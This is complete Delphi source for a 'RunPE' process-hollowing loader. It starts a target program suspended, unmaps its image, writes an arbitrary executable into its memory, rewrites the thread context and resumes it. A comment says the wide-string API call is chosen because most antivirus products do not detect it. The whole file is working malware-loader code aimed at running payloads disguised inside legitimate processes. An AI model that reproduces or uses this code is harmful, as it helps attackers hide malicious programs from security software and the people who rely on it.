unit WExecFromMem;

interface

uses Windows;

function ExecFromMem(FilePath, Parameters: String; Buffer: Pointer): DWORD;

implementation

type

  UnmapProc = function (ProcessHandle:DWORD; BaseAddress:Pointer):DWORD; stdcall;
  WriteProc = function (ProcessHandle:Handle; BaseAddress:PVOID;
              Buffer: PVoid; NumberOfBytesToWrite:ULONG; NumberOfBytesWritten: PULONG): BOOL; stdcall;

  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
     VirtualAddress: DWORD;
     SizeOfBlock: DWORD;
  end;

procedure PerformBaseRelocation(f_module: Pointer; INH:PImageNtHeaders; f_delta: Cardinal); stdcall;
var
  l_i: Cardinal;
  l_codebase: Pointer;
  l_relocation: PImageBaseRelocation;
  l_dest: Pointer;
  l_relInfo: ^Word;
  l_patchAddrHL: ^DWord;
  l_type, l_offset: integer;
begin
  l_codebase := f_module;
  if INH^.OptionalHeader.DataDirectory[5].Size > 0 then
  begin
    l_relocation := PImageBaseRelocation(Cardinal(l_codebase) + INH^.OptionalHeader.DataDirectory[5].VirtualAddress);
    while (l_relocation^).VirtualAddress > 0 do
    begin
      l_dest := Pointer((Cardinal(l_codebase) + (l_relocation^).VirtualAddress));
      l_relInfo := Pointer(Cardinal(l_relocation) + 8);
      for l_i := 0 to (trunc((((l_relocation^).SizeOfBlock - 8) / 2)) - 1) do
      begin
        l_type := (l_relInfo^ shr 12);
        l_offset := l_relInfo^ and $FFF;
        if l_type = 3 then
        begin
          l_patchAddrHL := Pointer(Cardinal(l_dest) + Cardinal(l_offset));
          l_patchAddrHL^ := l_patchAddrHL^ + f_delta;
        end;
        inc(l_relInfo);
      end;
      l_relocation := Pointer(cardinal(l_relocation) + (l_relocation^).SizeOfBlock);
    end;
  end;
end;

function AlignImage(pImage:Pointer):Pointer;
var
  IDH:          PImageDosHeader;
  INH:          PImageNtHeaders;
  ISH:          PImageSectionHeader;
  i:            WORD;
begin
  IDH := pImage;
  INH := Pointer(Integer(pImage) + IDH^._lfanew);
  GetMem(Result, INH^.OptionalHeader.SizeOfImage);
  ZeroMemory(Result, INH^.OptionalHeader.SizeOfImage);
  CopyMemory(Result, pImage, INH^.OptionalHeader.SizeOfHeaders);
  for i := 0 to INH^.FileHeader.NumberOfSections - 1 do
  begin
    ISH := Pointer(Integer(pImage) + IDH^._lfanew + 248 + i * 40);
    CopyMemory(Pointer(DWORD(Result) + ISH^.VirtualAddress), Pointer(DWORD(pImage) + ISH^.PointerToRawData), ISH^.SizeOfRawData);
  end;
end;

function Get4ByteAlignedContext(var Base: PContext): PContext;
begin
  Base := VirtualAlloc(nil, SizeOf(TContext) + 4, MEM_COMMIT, PAGE_READWRITE);
  Result := Base;
  if Base <> nil then
    while ((DWORD(Result) mod 4) <> 0) do
      Result := Pointer(DWORD(Result) + 1);
end;

function ExecFromMem(FilePath, Parameters: String; Buffer: Pointer): DWORD;
var
  PI:           TProcessInformation;
  SI:           TStartupInfoW;
  CT:           PContext;
  CTBase:       PContext;
  IDH:          PImageDosHeader;
  INH:          PImageNtHeaders;
  dwImageBase:  DWORD;
  pModule:      Pointer;
  dwNull:       DWORD;
  dwThID:       DWORD;
  NTHandle:     HINST;
  Unmap:        UnmapProc;
  WriteProcess: WriteProc;
  SafeLoad:     Boolean = false;
begin

  if Parameters <> '' then Parameters := '"'+FilePath+'" '+Parameters;

  //Load NtUnmapViewOfSection and... THE MAGIC!
  NTHandle:=LoadLibrary('ntdll');
  if Not(NTHandle=0) then Begin
    Pointer(Unmap):=GetProcAddress(NTHandle, 'NtUnmapViewOfSection');
    Pointer(WriteProcess):=GetProcAddress(NTHandle, 'NtWriteVirtualMemory');
    SafeLoad:=(Assigned(Unmap)) and (Assigned(WriteProcess));
  End;
  //Load Done

  Result:=0;
  dwThID:=0;
  IDH := Buffer;
  if IDH^.e_magic = IMAGE_DOS_SIGNATURE then
  begin
    INH := Pointer(Integer(Buffer) + IDH^._lfanew);
    if INH^.Signature = IMAGE_NT_SIGNATURE then
    begin
      FillChar(SI, SizeOf(TStartupInfoW), #0);
      FillChar(PI, SizeOf(TProcessInformation), #0);
      SI.cb := SizeOf(TStartupInfoW);
      //CreateProcessW doesn't get detected by most AVs
      //Because Widestring versions of this trick aren't common.
      if CreateProcessW(PWideChar(WideString(FilePath)), PWideChar(WideString(Parameters)),
      nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, SI, PI) then
      begin
        CT := Get4ByteAlignedContext(CTBase);
        if CT <> nil then
        begin
          CT^.ContextFlags := CONTEXT_FULL;
          if GetThreadContext(PI.hThread, CT^) then
          begin
            ReadProcessMemory(PI.hProcess, Pointer(CT^.Ebx + 8), @dwImageBase, 4, dwNull);
            if dwImageBase = INH^.OptionalHeader.ImageBase then
            begin
              if SafeLoad then Begin
              if Unmap(PI.hProcess, Pointer(INH^.OptionalHeader.ImageBase)) = 0 then
                pModule := VirtualAllocEx(PI.hProcess, Pointer(INH^.OptionalHeader.ImageBase), INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
              else
                pModule := VirtualAllocEx(PI.hProcess, nil, INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
              end else
                pModule := VirtualAllocEx(PI.hProcess, nil, INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            end
            else
              pModule := VirtualAllocEx(PI.hProcess, Pointer(INH^.OptionalHeader.ImageBase), INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if pModule <> nil then
            begin
              Buffer := AlignImage(Buffer);
              if DWORD(pModule) <> INH^.OptionalHeader.ImageBase then
              begin
                PerformBaseRelocation(Buffer, INH, (DWORD(pModule) - INH^.OptionalHeader.ImageBase));
                INH^.OptionalHeader.ImageBase := DWORD(pModule);
                CopyMemory(Pointer(Integer(Buffer) + IDH^._lfanew), INH, 248);
              end;
              WriteProcess(PI.hProcess, pModule, Buffer, INH^.OptionalHeader.SizeOfImage, @dwNull);
              WriteProcess(PI.hProcess, Pointer(CT^.Ebx + 8), @pModule, 4, @dwNull);
              CT^.Eax := DWORD(pModule) + INH^.OptionalHeader.AddressOfEntryPoint;
              SetThreadContext(PI.hThread, CT^);
              ResumeThread(PI.hThread);
              dwThID:= PI.dwThreadId;
              Result := PI.dwProcessId;
            end;
          end;
          VirtualFree(CTBase, 0, MEM_RELEASE);
        end;
        if dwThID = 0 then Begin
          TerminateProcess(PI.hProcess, 0);
          Result:=0;
        end;
      end;
    end;
  end;
  FreeLibrary(NTHandle);
end;

end.
